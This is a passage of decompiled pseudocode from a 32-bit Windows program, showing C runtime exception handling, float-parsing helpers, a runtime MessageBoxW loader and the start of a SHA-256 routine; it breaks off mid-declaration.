    if ( a1 > 0x1FFFFFFF || (v4 = operator new(8 * a1)) == 0 )
    {
      v2 = 0;
      std::exception::exception((std::exception *)pExceptionObject, (const char *const *)&v2);
      pExceptionObject[0] = (int)&std::bad_alloc::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
  }
  return v4;
}
// 423904: using guessed type void *std::bad_alloc::`vftable';

//----- (0040BB07) --------------------------------------------------------
void __cdecl sub_40BB07(void *a1)
{
  operator delete(a1);
}

//----- (0040C2D5) --------------------------------------------------------
void __thiscall sub_40C2D5(std::exception *this)
{
  *(_DWORD *)this = &std::exception::`vftable';
  std::exception::_Tidy(this);
}
// 423BA8: using guessed type void *std::exception::`vftable';

//----- (0040C2E0) --------------------------------------------------------
std::exception *__thiscall sub_40C2E0(std::exception *this, char a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  std::exception::_Tidy(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}
// 423BA8: using guessed type void *std::exception::`vftable';

//----- (0040C32C) --------------------------------------------------------
void __thiscall sub_40C32C(struct type_info *this)
{
  *(_DWORD *)this = &type_info::`vftable';
  type_info::_Type_info_dtor(this);
}
// 423BC8: using guessed type void *type_info::`vftable';

//----- (0040C33C) --------------------------------------------------------
struct type_info *__thiscall sub_40C33C(struct type_info *this, char a2)
{
  sub_40C32C(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (0040D9C9) --------------------------------------------------------
void *__cdecl sub_40D9C9(void *a1)
{
  void *result; // eax

  result = a1;
  Ptr = a1;
  return result;
}

//----- (0040F3BC) --------------------------------------------------------
int sub_40F3BC()
{
  return dword_44AA1C;
}
// 44AA1C: using guessed type int dword_44AA1C;

//----- (004106B3) --------------------------------------------------------
int sub_4106B3()
{
  return flsall(1);
}
// 410586: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (004106BC) --------------------------------------------------------
void **sub_4106BC()
{
  return &off_44AA50;
}
// 44AA50: using guessed type void *off_44AA50;

//----- (004115A2) --------------------------------------------------------
void __thiscall sub_4115A2(std::exception *this)
{
  *(_DWORD *)this = &std::bad_exception::`vftable';
  sub_40C2D5(this);
}
// 4240E8: using guessed type void *std::bad_exception::`vftable';

//----- (004115AD) --------------------------------------------------------
std::exception *__thiscall sub_4115AD(std::exception *this, char a2)
{
  *(_DWORD *)this = &std::bad_exception::`vftable';
  sub_40C2D5(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}
// 4240E8: using guessed type void *std::bad_exception::`vftable';

//----- (00412177) --------------------------------------------------------
std::exception *__thiscall sub_412177(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_exception::`vftable';
  return this;
}
// 4240E8: using guessed type void *std::bad_exception::`vftable';

//----- (00412416) --------------------------------------------------------
int sub_412416()
{
  dword_454940 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 454940: using guessed type int dword_454940;

//----- (00412560) --------------------------------------------------------
void *__cdecl sub_412560(void *a1)
{
  void *result; // eax

  result = a1;
  dword_4523AC = a1;
  return result;
}

//----- (00413486) --------------------------------------------------------
int sub_413486()
{
  dword_454924 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 454924: using guessed type int dword_454924;

//----- (00414C04) --------------------------------------------------------
int __cdecl sub_414C04(int a1, int a2)
{
  return CallDestructExceptionObject(a1, a2);
}
// 414C10: using guessed type _DWORD __cdecl CallDestructExceptionObject(_DWORD, _DWORD);

//----- (004151D8) --------------------------------------------------------
int sub_4151D8()
{
  SetUnhandledExceptionFilter(__CxxUnhandledExceptionFilter);
  return 0;
}

//----- (0041560D) --------------------------------------------------------
void *sub_41560D()
{
  return &unk_447BBC;
}

//----- (00415633) --------------------------------------------------------
void __cdecl sub_415633()
{
  ;
}

//----- (00416ECE) --------------------------------------------------------
int __cdecl sub_416ECE(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_453160;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 453160: using guessed type int dword_453160;

//----- (00417410) --------------------------------------------------------
void sub_417410()
{
  dword_454920 = 0;
}
// 454920: using guessed type int dword_454920;

//----- (00417F06) --------------------------------------------------------
int __cdecl sub_417F06(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_419D0A(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 41A7AC: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 417F06: using guessed type char var_28[4];
// 417F06: using guessed type unsigned __int16 var_10[6];

//----- (00417FAE) --------------------------------------------------------
int __cdecl sub_417FAE(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_41A25B(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 41A7AC: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 417FAE: using guessed type char var_28[4];
// 417FAE: using guessed type unsigned __int16 var_10[6];

//----- (00418816) --------------------------------------------------------
PVOID sub_418816()
{
  return DecodePointer(dword_453138);
}

//----- (004189C6) --------------------------------------------------------
int __cdecl sub_4189C6(int a1)
{
  int result; // eax

  result = a1;
  dword_453144 = a1;
  return result;
}
// 453144: using guessed type int dword_453144;

//----- (004189D5) --------------------------------------------------------
int __cdecl sub_4189D5(int a1)
{
  int result; // eax

  result = a1;
  dword_453148 = a1;
  return result;
}
// 453148: using guessed type int dword_453148;

//----- (00418B13) --------------------------------------------------------
int __cdecl sub_418B13(int a1, int a2, int a3)
{
  HMODULE LibraryW; // eax
  HMODULE v4; // ebx
  int (__stdcall *MessageBoxW)(HWND, LPCWSTR, LPCWSTR, UINT); // eax
  HWND (__stdcall *GetActiveWindow)(); // eax
  HWND (__stdcall *GetLastActivePopup)(HWND); // eax
  BOOL (__stdcall *GetUserObjectInformationW)(HANDLE, int, PVOID, DWORD, LPDWORD); // eax
  HWINSTA (__stdcall *GetProcessWindowStation)(); // eax
  int (*v10)(void); // edi
  int (__stdcall *v11)(int, int, char *, int, char *); // eax
  int (__stdcall *v12)(int, int, char *, int, char *); // ebx
  int v13; // eax
  int (*v14)(void); // eax
  int (__stdcall *v15)(int); // eax
  int (__stdcall *v16)(int, int, int, int); // eax
  char v18[4]; // [esp+Ch] [ebp-24h] BYREF
  int v19; // [esp+10h] [ebp-20h]
  int v20; // [esp+14h] [ebp-1Ch]
  PVOID v21; // [esp+18h] [ebp-18h]
  int v22; // [esp+1Ch] [ebp-14h]
  char v23[12]; // [esp+20h] [ebp-10h] BYREF

  v19 = a1;
  v20 = a2;
  v22 = 0;
  v21 = (PVOID)_encoded_null();
  if ( !dword_45314C )
  {
    LibraryW = LoadLibraryW(L"USER32.DLL");
    v4 = LibraryW;
    if ( !LibraryW )
      return 0;
    MessageBoxW = (int (__stdcall *)(HWND, LPCWSTR, LPCWSTR, UINT))GetProcAddress(LibraryW, "MessageBoxW");
    if ( !MessageBoxW )
      return 0;
    dword_45314C = EncodePointer(MessageBoxW);
    GetActiveWindow = (HWND (__stdcall *)())GetProcAddress(v4, "GetActiveWindow");
    dword_453150 = EncodePointer(GetActiveWindow);
    GetLastActivePopup = (HWND (__stdcall *)(HWND))GetProcAddress(v4, "GetLastActivePopup");
    dword_453154 = EncodePointer(GetLastActivePopup);
    GetUserObjectInformationW = (BOOL (__stdcall *)(HANDLE, int, PVOID, DWORD, LPDWORD))GetProcAddress(
                                                                                          v4,
                                                                                          "GetUserObjectInformationW");
    dword_45315C = EncodePointer(GetUserObjectInformationW);
    if ( dword_45315C )
    {
      GetProcessWindowStation = (HWINSTA (__stdcall *)())GetProcAddress(v4, "GetProcessWindowStation");
      dword_453158 = EncodePointer(GetProcessWindowStation);
    }
  }
  if ( dword_453158 == v21
    || dword_45315C == v21
    || (v10 = (int (*)(void))DecodePointer(dword_453158),
        v11 = (int (__stdcall *)(int, int, char *, int, char *))DecodePointer(dword_45315C),
        v12 = v11,
        !v10)
    || !v11
    || (v13 = v10()) != 0 && v12(v13, 1, v23, 12, v18) && (v23[8] & 1) != 0 )
  {
    if ( dword_453150 != v21 )
    {
      v14 = (int (*)(void))DecodePointer(dword_453150);
      if ( v14 )
      {
        v22 = v14();
        if ( v22 )
        {
          if ( dword_453154 != v21 )
          {
            v15 = (int (__stdcall *)(int))DecodePointer(dword_453154);
            if ( v15 )
              v22 = v15(v22);
          }
        }
      }
    }
  }
  else
  {
    a3 |= 0x200000u;
  }
  v16 = (int (__stdcall *)(int, int, int, int))DecodePointer(dword_45314C);
  if ( v16 )
    return v16(v22, v19, v20, a3);
  return 0;
}
// 40F390: using guessed type int _encoded_null(void);
// 418B13: using guessed type char var_24[4];

//----- (00418E7E) --------------------------------------------------------
int sub_418E7E()
{
  return 0;
}

//----- (00419D0A) --------------------------------------------------------
int __cdecl sub_419D0A(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // edi
  int *v9; // esi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // edi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  int v20; // edx
  int *v21; // ecx
  int v22; // esi
  int v23; // eax
  int *v24; // ebx
  bool n; // zf
  int v26; // eax
  unsigned int v27; // edx
  int *v28; // ecx
  unsigned int v29; // edi
  int ii; // ecx
  int *v31; // ecx
  unsigned int v32; // esi
  int v33; // edi
  int v34; // eax
  int v35; // edx
  int *v36; // ebx
  int v37; // edx
  int *v38; // ecx
  int v39; // eax
  int v40; // edx
  int *v41; // ebx
  int v42; // edx
  int *v43; // ecx
  int v44; // eax
  int v45; // edx
  int v46; // edx
  int *v47; // ecx
  unsigned int v48; // ebx
  int v49; // edx
  int v50; // [esp+8h] [ebp-38h]
  char v51; // [esp+10h] [ebp-30h]
  int v52; // [esp+10h] [ebp-30h]
  int v53; // [esp+14h] [ebp-2Ch]
  int v54; // [esp+14h] [ebp-2Ch]
  char v55; // [esp+14h] [ebp-2Ch]
  int v56; // [esp+14h] [ebp-2Ch]
  int v57; // [esp+14h] [ebp-2Ch]
  int v58; // [esp+14h] [ebp-2Ch]
  int v59; // [esp+18h] [ebp-28h]
  int v60; // [esp+18h] [ebp-28h]
  int v61; // [esp+18h] [ebp-28h]
  int v62; // [esp+18h] [ebp-28h]
  int v63; // [esp+18h] [ebp-28h]
  int v64; // [esp+18h] [ebp-28h]
  int v65; // [esp+1Ch] [ebp-24h]
  unsigned int v66; // [esp+20h] [ebp-20h]
  int m; // [esp+20h] [ebp-20h]
  int jj; // [esp+20h] [ebp-20h]
  int k; // [esp+20h] [ebp-20h]
  int j; // [esp+20h] [ebp-20h]
  int v71; // [esp+24h] [ebp-1Ch]
  int v72; // [esp+28h] [ebp-18h]
  int v73; // [esp+2Ch] [ebp-14h]
  int v74; // [esp+30h] [ebp-10h] BYREF
  int v75; // [esp+34h] [ebp-Ch]
  int v76; // [esp+38h] [ebp-8h] BYREF

  v2 = a1[5];
  v50 = v2 & 0x8000;
  v74 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v75 = *(_DWORD *)(a1 + 1);
  v76 = v4;
  if ( v3 != -16383 )
  {
    v65 = 0;
    v71 = v74;
    v72 = v75;
    v73 = v76;
    v8 = dword_44B24C - 1;
    v53 = v3;
    v59 = dword_44B24C / 32;
    v9 = &v74 + dword_44B24C / 32;
    v51 = 31 - dword_44B24C % 32;
    if ( ((1 << v51) & *v9) != 0 )
    {
      v10 = dword_44B24C / 32;
      for ( i = (~(-1 << (31 - dword_44B24C % 32)) & *(&v74 + v59)) == 0; i; i = *(&v74 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_21;
      }
      v12 = v8 / 32;
      v65 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v74 + v8 / 32;
      v66 = v13 + *v14;
      if ( v66 >= *v14 )
      {
        v15 = v66 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v65 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v66;
        if ( v12 < 0 || !v65 )
          break;
        v65 = 0;
        v14 = &v74 + v12;
        v16 = *v14 + 1;
        v66 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
    }
LABEL_21:
    *v9 &= -1 << v51;
    if ( v59 + 1 < 3 )
      memset(&v74 + v59 + 1, 0, 4 * (3 - (v59 + 1)));
    if ( v65 )
      ++v3;
    if ( v3 >= dword_44B248 - dword_44B24C )
    {
      if ( v3 > dword_44B248 )
      {
        if ( v3 < dword_44B244 )
        {
          v5 = dword_44B258 + v3;
          v74 &= ~0x80000000;
          v44 = dword_44B250 / 32;
          v45 = dword_44B250 % 32;
          v64 = 0;
          for ( j = 0; j < 3; ++j )
          {
            v58 = ~(-1 << v45) & *(&v74 + j);
            *(&v74 + j) = v64 | ((unsigned int)*(&v74 + j) >> v45);
            v64 = v58 << (32 - v45);
          }
          v46 = 2;
          v47 = &v76 - v44;
          do
          {
            if ( v46 < v44 )
              *(&v74 + v46) = 0;
            else
              *(&v74 + v46) = *v47;
            --v47;
            --v46;
          }
          while ( v46 >= 0 );
          result = 0;
        }
        else
        {
          v75 = 0;
          v76 = 0;
          v74 = 0x80000000;
          v39 = dword_44B250 / 32;
          v40 = dword_44B250 % 32;
          v63 = 0;
          for ( k = 0; k < 3; ++k )
          {
            v41 = &v74 + k;
            v57 = ~(-1 << v40) & *v41;
            *v41 = v63 | ((unsigned int)*v41 >> v40);
            v63 = v57 << (32 - v40);
          }
          v42 = 2;
          v43 = &v76 - v39;
          do
          {
            if ( v42 < v39 )
              *(&v74 + v42) = 0;
            else
              *(&v74 + v42) = *v43;
            --v43;
            --v42;
          }
          while ( v42 >= 0 );
          v5 = dword_44B244 + dword_44B258;
          result = 1;
        }
        goto LABEL_78;
      }
      v74 = v71;
      v75 = v72;
      v17 = (dword_44B248 - v53) / 32;
      v76 = v73;
      v18 = (dword_44B248 - v53) % 32;
      v60 = 0;
      for ( m = 0; m < 3; ++m )
      {
        v19 = &v74 + m;
        v54 = ~(-1 << v18) & *v19;
        *v19 = v60 | ((unsigned int)*v19 >> v18);
        v60 = v54 << (32 - v18);
      }
      v20 = 2;
      v21 = &v76 - v17;
      do
      {
        if ( v20 < v17 )
          *(&v74 + v20) = 0;
        else
          *(&v74 + v20) = *v21;
        --v21;
        --v20;
      }
      while ( v20 >= 0 );
      v22 = dword_44B24C - 1;
      v23 = dword_44B24C / 32;
      v52 = dword_44B24C / 32;
      v24 = &v74 + dword_44B24C / 32;
      v55 = 31 - dword_44B24C % 32;
      if ( ((1 << v55) & *v24) != 0 )
      {
        for ( n = (~(-1 << (31 - dword_44B24C % 32)) & *(&v74 + v23)) == 0; n; n = *(&v74 + v23) == 0 )
        {
          if ( ++v23 >= 3 )
            goto LABEL_51;
        }
        v26 = v22 / 32;
        v61 = 0;
        v27 = 1 << (31 - v22 % 32);
        v28 = &v74 + v22 / 32;
        v29 = *v28 + v27;
        if ( v29 < *v28 || v29 < v27 )
          v61 = 1;
        *v28 = v29;
        for ( ii = v61; --v26 >= 0 && ii; ii = v33 )
        {
          v31 = &v74 + v26;
          v32 = *v31 + 1;
          v33 = 0;
          if ( v32 < *v31 || *v31 == -1 )
            v33 = 1;
          *v31 = v32;
        }
      }
LABEL_51:
      *v24 &= -1 << v55;
      if ( v52 + 1 < 3 )
        memset(&v74 + v52 + 1, 0, 4 * (3 - (v52 + 1)));
      v34 = (dword_44B250 + 1) / 32;
      v35 = (dword_44B250 + 1) % 32;
      v62 = 0;
      for ( jj = 0; jj < 3; ++jj )
      {
        v36 = &v74 + jj;
        v56 = ~(-1 << v35) & *v36;
        *v36 = v62 | ((unsigned int)*v36 >> v35);
        v62 = v56 << (32 - v35);
      }
      v37 = 2;
      v38 = &v76 - v34;
      do
      {
        if ( v37 < v34 )
          *(&v74 + v37) = 0;
        else
          *(&v74 + v37) = *v38;
        --v38;
        --v37;
      }
      while ( v37 >= 0 );
    }
    else
    {
      v74 = 0;
      v75 = 0;
      v76 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_78;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v74 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_78;
    }
  }
  v74 = 0;
  v75 = 0;
  v76 = 0;
  result = 2;
LABEL_78:
  v48 = v74 | (v50 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_44B250));
  if ( dword_44B254 == 64 )
  {
    v49 = v75;
    a2[1] = v48;
    *a2 = v49;
  }
  else if ( dword_44B254 == 32 )
  {
    *a2 = v48;
  }
  return result;
}
// 44B244: using guessed type int dword_44B244;
// 44B248: using guessed type int dword_44B248;
// 44B24C: using guessed type int dword_44B24C;
// 44B250: using guessed type int dword_44B250;
// 44B254: using guessed type int dword_44B254;
// 44B258: using guessed type int dword_44B258;

//----- (0041A25B) --------------------------------------------------------
int __cdecl sub_41A25B(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // edi
  int *v9; // esi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // edi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  int v20; // edx
  int *v21; // ecx
  int v22; // esi
  int v23; // eax
  int *v24; // ebx
  bool n; // zf
  int v26; // eax
  unsigned int v27; // edx
  int *v28; // ecx
  unsigned int v29; // edi
  int ii; // ecx
  int *v31; // ecx
  unsigned int v32; // esi
  int v33; // edi
  int v34; // eax
  int v35; // edx
  int *v36; // ebx
  int v37; // edx
  int *v38; // ecx
  int v39; // eax
  int v40; // edx
  int *v41; // ebx
  int v42; // edx
  int *v43; // ecx
  int v44; // eax
  int v45; // edx
  int v46; // edx
  int *v47; // ecx
  unsigned int v48; // ebx
  int v49; // edx
  int v50; // [esp+8h] [ebp-38h]
  char v51; // [esp+10h] [ebp-30h]
  int v52; // [esp+10h] [ebp-30h]
  int v53; // [esp+14h] [ebp-2Ch]
  int v54; // [esp+14h] [ebp-2Ch]
  char v55; // [esp+14h] [ebp-2Ch]
  int v56; // [esp+14h] [ebp-2Ch]
  int v57; // [esp+14h] [ebp-2Ch]
  int v58; // [esp+14h] [ebp-2Ch]
  int v59; // [esp+18h] [ebp-28h]
  int v60; // [esp+18h] [ebp-28h]
  int v61; // [esp+18h] [ebp-28h]
  int v62; // [esp+18h] [ebp-28h]
  int v63; // [esp+18h] [ebp-28h]
  int v64; // [esp+18h] [ebp-28h]
  int v65; // [esp+1Ch] [ebp-24h]
  unsigned int v66; // [esp+20h] [ebp-20h]
  int m; // [esp+20h] [ebp-20h]
  int jj; // [esp+20h] [ebp-20h]
  int k; // [esp+20h] [ebp-20h]
  int j; // [esp+20h] [ebp-20h]
  int v71; // [esp+24h] [ebp-1Ch]
  int v72; // [esp+28h] [ebp-18h]
  int v73; // [esp+2Ch] [ebp-14h]
  int v74; // [esp+30h] [ebp-10h] BYREF
  int v75; // [esp+34h] [ebp-Ch]
  int v76; // [esp+38h] [ebp-8h] BYREF

  v2 = a1[5];
  v50 = v2 & 0x8000;
  v74 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v75 = *(_DWORD *)(a1 + 1);
  v76 = v4;
  if ( v3 != -16383 )
  {
    v65 = 0;
    v71 = v74;
    v72 = v75;
    v73 = v76;
    v8 = dword_44B264 - 1;
    v53 = v3;
    v59 = dword_44B264 / 32;
    v9 = &v74 + dword_44B264 / 32;
    v51 = 31 - dword_44B264 % 32;
    if ( ((1 << v51) & *v9) != 0 )
    {
      v10 = dword_44B264 / 32;
      for ( i = (~(-1 << (31 - dword_44B264 % 32)) & *(&v74 + v59)) == 0; i; i = *(&v74 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_21;
      }
      v12 = v8 / 32;
      v65 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v74 + v8 / 32;
      v66 = v13 + *v14;
      if ( v66 >= *v14 )
      {
        v15 = v66 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v65 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v66;
        if ( v12 < 0 || !v65 )
          break;
        v65 = 0;
        v14 = &v74 + v12;
        v16 = *v14 + 1;
        v66 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
    }
LABEL_21:
    *v9 &= -1 << v51;
    if ( v59 + 1 < 3 )
      memset(&v74 + v59 + 1, 0, 4 * (3 - (v59 + 1)));
    if ( v65 )
      ++v3;
    if ( v3 >= dword_44B260 - dword_44B264 )
    {
      if ( v3 > dword_44B260 )
      {
        if ( v3 < dword_44B25C )
        {
          v5 = dword_44B270 + v3;
          v74 &= ~0x80000000;
          v44 = dword_44B268 / 32;
          v45 = dword_44B268 % 32;
          v64 = 0;
          for ( j = 0; j < 3; ++j )
          {
            v58 = ~(-1 << v45) & *(&v74 + j);
            *(&v74 + j) = v64 | ((unsigned int)*(&v74 + j) >> v45);
            v64 = v58 << (32 - v45);
          }
          v46 = 2;
          v47 = &v76 - v44;
          do
          {
            if ( v46 < v44 )
              *(&v74 + v46) = 0;
            else
              *(&v74 + v46) = *v47;
            --v47;
            --v46;
          }
          while ( v46 >= 0 );
          result = 0;
        }
        else
        {
          v75 = 0;
          v76 = 0;
          v74 = 0x80000000;
          v39 = dword_44B268 / 32;
          v40 = dword_44B268 % 32;
          v63 = 0;
          for ( k = 0; k < 3; ++k )
          {
            v41 = &v74 + k;
            v57 = ~(-1 << v40) & *v41;
            *v41 = v63 | ((unsigned int)*v41 >> v40);
            v63 = v57 << (32 - v40);
          }
          v42 = 2;
          v43 = &v76 - v39;
          do
          {
            if ( v42 < v39 )
              *(&v74 + v42) = 0;
            else
              *(&v74 + v42) = *v43;
            --v43;
            --v42;
          }
          while ( v42 >= 0 );
          v5 = dword_44B25C + dword_44B270;
          result = 1;
        }
        goto LABEL_78;
      }
      v74 = v71;
      v75 = v72;
      v17 = (dword_44B260 - v53) / 32;
      v76 = v73;
      v18 = (dword_44B260 - v53) % 32;
      v60 = 0;
      for ( m = 0; m < 3; ++m )
      {
        v19 = &v74 + m;
        v54 = ~(-1 << v18) & *v19;
        *v19 = v60 | ((unsigned int)*v19 >> v18);
        v60 = v54 << (32 - v18);
      }
      v20 = 2;
      v21 = &v76 - v17;
      do
      {
        if ( v20 < v17 )
          *(&v74 + v20) = 0;
        else
          *(&v74 + v20) = *v21;
        --v21;
        --v20;
      }
      while ( v20 >= 0 );
      v22 = dword_44B264 - 1;
      v23 = dword_44B264 / 32;
      v52 = dword_44B264 / 32;
      v24 = &v74 + dword_44B264 / 32;
      v55 = 31 - dword_44B264 % 32;
      if ( ((1 << v55) & *v24) != 0 )
      {
        for ( n = (~(-1 << (31 - dword_44B264 % 32)) & *(&v74 + v23)) == 0; n; n = *(&v74 + v23) == 0 )
        {
          if ( ++v23 >= 3 )
            goto LABEL_51;
        }
        v26 = v22 / 32;
        v61 = 0;
        v27 = 1 << (31 - v22 % 32);
        v28 = &v74 + v22 / 32;
        v29 = *v28 + v27;
        if ( v29 < *v28 || v29 < v27 )
          v61 = 1;
        *v28 = v29;
        for ( ii = v61; --v26 >= 0 && ii; ii = v33 )
        {
          v31 = &v74 + v26;
          v32 = *v31 + 1;
          v33 = 0;
          if ( v32 < *v31 || *v31 == -1 )
            v33 = 1;
          *v31 = v32;
        }
      }
LABEL_51:
      *v24 &= -1 << v55;
      if ( v52 + 1 < 3 )
        memset(&v74 + v52 + 1, 0, 4 * (3 - (v52 + 1)));
      v34 = (dword_44B268 + 1) / 32;
      v35 = (dword_44B268 + 1) % 32;
      v62 = 0;
      for ( jj = 0; jj < 3; ++jj )
      {
        v36 = &v74 + jj;
        v56 = ~(-1 << v35) & *v36;
        *v36 = v62 | ((unsigned int)*v36 >> v35);
        v62 = v56 << (32 - v35);
      }
      v37 = 2;
      v38 = &v76 - v34;
      do
      {
        if ( v37 < v34 )
          *(&v74 + v37) = 0;
        else
          *(&v74 + v37) = *v38;
        --v38;
        --v37;
      }
      while ( v37 >= 0 );
    }
    else
    {
      v74 = 0;
      v75 = 0;
      v76 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_78;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v74 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_78;
    }
  }
  v74 = 0;
  v75 = 0;
  v76 = 0;
  result = 2;
LABEL_78:
  v48 = v74 | (v50 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_44B268));
  if ( dword_44B26C == 64 )
  {
    v49 = v75;
    a2[1] = v48;
    *a2 = v49;
  }
  else if ( dword_44B26C == 32 )
  {
    *a2 = v48;
  }
  return result;
}
// 44B25C: using guessed type int dword_44B25C;
// 44B260: using guessed type int dword_44B260;
// 44B264: using guessed type int dword_44B264;
// 44B268: using guessed type int dword_44B268;
// 44B26C: using guessed type int dword_44B26C;
// 44B270: using guessed type int dword_44B270;

//----- (0041BC7C) --------------------------------------------------------
HANDLE sub_41BC7C()
{
  HANDLE result; // eax

  result = hObject;
  if ( hObject != (HANDLE)-1 && hObject != (HANDLE)-2 )
    return (HANDLE)CloseHandle(hObject);
  return result;
}

//----- (0041BE80) --------------------------------------------------------
void sub_41BE80()
{
  sub_41D4F0();
  if ( !sub_41D930(dword_44B538) )
  {
    sub_41DC20(0, &dword_44B538);
    sub_41DC20(0, &dword_44BCF0);
  }
}
// 44B538: using guessed type int dword_44B538;
// 44BCF0: using guessed type _DWORD dword_44BCF0;

//----- (0041BEC0) --------------------------------------------------------
int __cdecl sub_41BEC0(_DWORD *a1)
{
  memset(a1, 0, 0x70u);
  *a1 = 1779033703;
  a1[1] = -1150833019;
  a1[2] = 1013904242;
  a1[3] = -1521486534;
  a1[4] = 1359893119;
  a1[5] = -1694144372;
  a1[6] = 528734635;
  a1[7] = 1541459225;
  a1[27] = 32;
  return 1;
}

//----- (0041BF20) --------------------------------------------------------
unsigned int *__cdecl sub_41BF20(unsigned int *a1, int a2)
{
  _DWORD *v2; // ecx
  unsigned int *result; // eax
  int v4; // ebx
  int v5; // esi
  int v6; // edi
  int v7; // edx
  int v8; // edi
  int v9; // ecx
  int v10; // ebx
  int v11; // ecx
  int v12; // edi
  int v13; // esi
  int v14; // edi
  int v15; // edx
  int v16; // edi
  int v17; // edi
  int v18; // edx
  int v19; // edx
  int v20; // edx
  int v21; // edi
  int v22; // ebp
  int v23; // ecx
  int v24; // ecx
  int v25; // edi
  int v26; // esi
  int v27; // edi
  int v28; // edi
  int v29; // esi
  int v30; // edx
  int v31; // esi
  int v32; // ecx
  int v33; // esi
  int v34; // edi
  char v35; // di
  int v36; // edi
  int v37; // edi
  int v38; // edi
  int v39; // edi
  int v40; // edx
  int v41; // edi
  int v42; // edi
  int v43; // ecx
  int v44; // edi
  int v45; // edi
  int v46; // ebx
  int v47; // edi
  int v48; // edi
  int v49; // esi
  int v50; // edi
  int v51; // esi
  int v52; // edi
